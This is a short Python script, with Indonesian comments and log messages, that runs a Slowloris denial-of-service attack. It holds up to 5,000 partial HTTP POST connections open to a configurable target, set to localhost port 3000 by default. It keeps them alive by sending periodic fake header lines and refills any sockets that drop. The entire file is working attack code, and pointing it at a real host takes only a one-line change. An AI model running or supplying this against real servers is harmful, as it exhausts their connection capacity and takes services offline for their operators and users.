import socket
import time
import threading

# CONFIGURABLE
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 3000
NUM_SOCKETS = 5000  # Banyak koneksi simultan
HEADER_INTERVAL = 10  # Detik antar keep-alive header

sockets = []


def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(b"POST /data HTTP/1.1\r\n")
        s.sendall(f"Host: {TARGET_HOST}\r\n".encode())
        return s
    except Exception as e:
        print(f"[!] Socket error: {e}")
        return None


def attack():
    while True:
        print(f"[+] Kirim keep-alive header ke {len(sockets)} koneksi")
        for s in sockets[:]:
            try:
                s.sendall(b"X-a: keep-alive\r\n")
            except:
                sockets.remove(s)
        time.sleep(HEADER_INTERVAL)


def refill_sockets():
    while True:
        if len(sockets) < NUM_SOCKETS:
            print(f"[~] Refill socket... (current: {len(sockets)})")
            s = init_socket()
            if s:
                sockets.append(s)
        time.sleep(1)


def start_attack():
    print(f"[⚔️] Memulai serangan Slowloris ke {TARGET_HOST}:{TARGET_PORT} dengan {NUM_SOCKETS} koneksi...")

    for _ in range(NUM_SOCKETS):
        s = init_socket()
        if s:
            sockets.append(s)

    threading.Thread(target=attack, daemon=True).start()
    threading.Thread(target=refill_sockets, daemon=True).start()

    while True:
        time.sleep(10)


if __name__ == "__main__":
    start_attack()
